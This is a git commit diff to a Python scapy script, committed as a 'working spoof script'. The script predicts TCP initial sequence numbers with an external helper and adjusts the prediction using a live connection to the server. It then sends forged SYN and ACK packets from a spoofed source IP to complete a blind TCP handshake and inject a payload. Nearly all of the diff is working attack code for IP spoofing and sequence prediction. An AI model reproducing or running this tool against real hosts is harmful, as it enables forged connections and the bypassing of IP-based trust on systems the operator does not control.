5441b0af015a646fa678ddb37473733c270b6e61
dcashman <dan.a.cashman@gmail.com>
2013-02-01 18:17:54 -0800

    working spoof script before timing addition

--- misc/network/src/spoof_handshake.py
+++ misc/network/src/spoof_handshake.py
@@ -1,7 +1,8 @@
 #!/usr/local/bin/python
 
 import sys
-from scapy.all import TCP, IP, sr1
+from scapy.all import *
+from time import sleep
 import subprocess
 
 
@@ -14,24 +15,43 @@ remote_ip = sys.argv[3]
 remote_port = sys.argv[4]
 spoof_ip = sys.argv[5]
 spoof_port = sys.argv[6]
+seq_create = sys.argv[7]
 
 #determine sequence numbers ahead-of-time to reduce delay before spoof
 #local_ip here is dest_ip for server
-seq_num_output_current = subprocess.check_output(["repro_seq/seq_create", remote_ip, remote_port, local_ip, local_port])
+seq_num_output_current = subprocess.check_output([seq_create, remote_ip, remote_port, local_ip, local_port])
 
-seq_num_output_spoof = subprocess.check_output(["repro_seq/seq_create", remote_ip, remote_port, spoof_ip, spoof_port])
+seq_num_output_spoof = subprocess.check_output([seq_create, remote_ip, remote_port, spoof_ip, spoof_port])
 
 print(seq_num_output_current)
 print(seq_num_output_spoof)
 
 #create connection to server and record sequence number
+outbound_ip = IP(src=local_ip, dst=remote_ip)
+outbound_tcp = TCP(sport=int(local_port), dport=int(remote_port), flags="S")
+packet = outbound_ip/outbound_tcp
+response = sr1(packet)
+response_seq_num = int(response[TCP].seq)
 
-leg_outbound_ip = IP(dst=remote_ip, src=local_ip)
-#leg_outbound_tcp = TCP(sport=int(local_port), dport=int(remote_port))
-leg_outbound_tcp = TCP(dport=int(remote_port))
-packet = leg_outbound_ip/leg_outbound_tcp
-response, non_response = sr1(packet)
-print(response.summary())
+#calculate new sequence number for spoofed connection based on difference with current one
+seq_num_output_current = int(seq_num_output_current)
+seq_num_output_spoof = int(seq_num_output_spoof)
+spoof_seq = seq_num_output_spoof + (response_seq_num - seq_num_output_current)
+
+
+#create spoofed connection
+outbound_ip = IP(src=spoof_ip, dst=remote_ip)
+outbound_tcp = TCP(sport=int(spoof_port), dport=int(remote_port), flags="S")
+packet = outbound_ip/outbound_tcp
+send(packet)
+#sleep(.0001)
+outbound_tcp_ack = TCP(sport=int(spoof_port), dport=int(remote_port), flags="A", seq=1, ack=(spoof_seq+1))
+packet = outbound_ip/outbound_tcp_ack/"Boosh!"
+send(packet)
+
+
+
+
 
 
 #calculate time from sequence number
